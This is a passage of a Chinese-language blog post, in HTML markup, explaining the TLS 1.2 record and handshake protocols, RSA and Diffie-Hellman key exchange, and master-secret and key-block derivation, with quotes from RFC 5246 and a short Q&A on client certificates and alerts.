</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">empty state -------------------&gt; pending state ------------------&gt; current state
             Handshake Protocol                Change Cipher Spec
</code></pre></td></tr></table>
</div>
</div><p>初始当前状态（Current State）没有指定加密，压缩和 MAC 算法，因而在完成 TLS Handshaking Protocols 一系列动作之前，客户端和服务端的数据都是<strong>明文传输</strong>的；当 TLS 完成握手过程后，客户端和服务端确定了加密，压缩和 MAC 算法及其参数，数据（Record）会通过指定算法处理。</p>
<blockquote>
<p>其中，Record 首先被加密，然后添加 MAC（message authentication code）以保证数据完整性。</p>
</blockquote>
<h3 id="tls-handshaking-protocols">TLS Handshaking Protocols</h3>
<p>Handshakeing protocols 包括 Alert Protocol，Change Ciper Spec Protocol 和 Handshake protocol。本文不会详细介绍 Alert Protocol 和 Change Ciper Spec Protocol。</p>
<p>使用 RSA 算法的握手过程是这样的（已在总览中提到）</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/ssl_handshake_rsa.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/ssl_handshake_rsa.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/ssl_handshake_rsa.webp" data-sub-html="<h2>Source: Keyless SSL: The Nitty Gritty Technical Details</h2>">
        
    </a><figcaption class="image-caption">Source: <a href="https://blog.cloudflare.com/keyless-ssl-the-nitty-gritty-technical-details/" target="_blank" rel="noopener noreffer">Keyless SSL: The Nitty Gritty Technical Details</a></figcaption>
    </figure>
<p>客户端和服务端在握手 hello 消息中明文交换了 client_random 和 server_random ，使用 RSA 公钥加密传输 premaster secret ，最后通过算法，客户端和服务端分别计算 master secret。其中，不直接使用 premaster secret 的原因是：保证 secret 的随机性不受任意一方的影响。</p>
<p>除了使用 RSA 算法在公共信道交换密钥，还可以通过 Diffie–Hellman 算法。Diffie–Hellman 算法的原理是这样的</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/Diffie-Hellman_Key_Exchange.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/Diffie-Hellman_Key_Exchange.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/Diffie-Hellman_Key_Exchange.webp" data-sub-html="<h2>By Original schema: A.J. Han Vinck, University of Duisburg-Essen SVG version: Flugaal [Public domain], via Wikimedia Commons</h2>">
        
    </a><figcaption class="image-caption">By Original schema: A.J. Han Vinck, University of Duisburg-Essen SVG version: Flugaal [Public domain], via Wikimedia Commons</figcaption>
    </figure>
<p>使用 Diffie–Hellman 算法交换 <code>premaster secret</code> 的流程</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/ssl_handshake_diffie_hellman.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/ssl_handshake_diffie_hellman.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/ssl_handshake_diffie_hellman.webp" data-sub-html="<h2>Source: Keyless SSL: The Nitty Gritty Technical Details</h2>">
        
    </a><figcaption class="image-caption">Source: <a href="https://blog.cloudflare.com/keyless-ssl-the-nitty-gritty-technical-details/" target="_blank" rel="noopener noreffer">Keyless SSL: The Nitty Gritty Technical Details</a></figcaption>
    </figure>
<h2 id="小结">小结</h2>
<p>TLS Handshaking Protocols 协商了 TLS Record Protocol 使用的算法和所需参数，并验证了服务端身份；</p>
<p>TLS Record Protocol 在协商后保证应用层数据的完整性和隐私性。</p>
<p>TLS Handshaking Protocol 的核心是在公开信道上传递 premaster secret。</p>
<h2 id="qa">Q&amp;A</h2>
<h3 id="为什么传输内容不直接使用非对称加密">为什么传输内容不直接使用非对称加密？</h3>
<p>因为性能限制。</p>
<h3 id="https-能保证正常连接">HTTPS 能保证正常连接？</h3>
<p>不能。</p>
<blockquote>
<p>There are a number of ways in which a man-in-the-middle attacker can attempt to make two entities drop down to the least secure method they support.</p>
</blockquote>
<p>攻击者甚至可以直接丢弃双方的数据包</p>
<h3 id="服务端如何验证客户端身份">服务端如何验证客户端身份？</h3>
<p>通过 Client Certificate</p>
<blockquote>
<p>This message conveys the client’s certificate chain to the server; the server will use it when verifying the CertificateVerify message (when the client authentication is based on signing) or calculating the premaster secret (for non-ephemeral Diffie- Hellman). The certificate MUST be appropriate for the negotiated cipher suite’s key exchange algorithm, and any negotiated extensions.</p>
</blockquote>
<h3 id="alert-protocol-有什么作用">Alert protocol 有什么作用？</h3>
<p>Closure Alerts：防止 Truncation Attack</p>
<blockquote>
<p>In a truncation attack, an attacker inserts into a message a TCP code indicating the message has finished, thus preventing the recipient picking up the rest of the message. To prevent this, SSL from version v3 onward has a closing handshake, so the recipient knows the message has not ended until this has been performed.</p>
</blockquote>
<p>Error Alerts：错误处理</p>
<h3 id="master-secret-是如何计算的">master secret 是如何计算的</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">  master_secret = PRF (pre_master_secret, &#34;master secret&#34;,
                      ClientHello.random + ServerHello.random)
                      [0..47];
</code></pre></td></tr></table>
</div>
</div><h3 id="加密压缩和-mac-算法参数是如何计算的">加密，压缩和 MAC 算法参数是如何计算的</h3>
<p>Handshaking Protocols 使得客户端和服务端交换了三个参数：client_random，server_random 和 master_secret，通过以下算法生成算法所需要的参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">To generate the key material, compute

  key_block = PRF (SecurityParameters.master_secret,
                  &#34;key expansion&#34;,
                  SecurityParameters.`server_random` +
                  SecurityParameters.`client_random`);

until enough output has been generated.  Then, the key_block is
partitioned as follows:

  client_write_MAC_key [SecurityParameters.mac_key_length]
  server_write_MAC_key [SecurityParameters.mac_key_length]
  client_write_key [SecurityParameters.enc_key_length]
  server_write_key [SecurityParameters.enc_key_length]
  client_write_IV [SecurityParameters.fixed_iv_length]
  server_write_IV [SecurityParameters.fixed_iv_length]
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>The master secret is expanded into a sequence of secure bytes, which is then split to a client write MAC key, a server write MAC key, a client write encryption key, and a server write encryption key</p>
</blockquote>
<p>使用 Diffie-Hellman 算法的 TLS 握手细节</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/dh-detail.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/dh-detail.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/dh-detail.webp" data-sub-html="<h2>Source: https://cipherstuff.wordpress.com/</h2>">
        
    </a><figcaption class="image-caption">Source: <a href="https://cipherstuff.wordpress.com/">https://cipherstuff.wordpress.com/</a></figcaption>
    </figure>
<h2 id="拓展阅读">拓展阅读</h2>
<ul>
<li><a href="https://blog.cloudflare.com/keyless-ssl-the-nitty-gritty-technical-details/" target="_blank" rel="noopener noreffer">Keyless</a></li>
<li><a href="https://letsencrypt.org/" target="_blank" rel="noopener noreffer">Let’s Encrypt</a></li>
<li>Session resume</li>
<li>证书 Revoke</li>
</ul>
<h2 id="参考">参考</h2>
<ul>
<li>
<p>[1] <a href="https://tools.ietf.org/html/rfc5246" target="_blank" rel="noopener noreffer">TLS1.2 规范</a></p>
</li>
<li>
<p>[2] <a href="https://tools.ietf.org/html/rfc5280" target="_blank" rel="noopener noreffer">PKI 规范</a></p>
</li>
<li>
<p>[3] <a href="http://www.youdzone.com/signature.html" target="_blank" rel="noopener noreffer">证书和数字签名</a></p>
</li>
<li>
<p>[4] <a href="https://blog.cloudflare.com/keyless-ssl-the-nitty-gritty-technical-details/" target="_blank" rel="noopener noreffer">TLS Handshake</a></p>
</li>
</ul>]]></description>
</item></channel>
</rss>
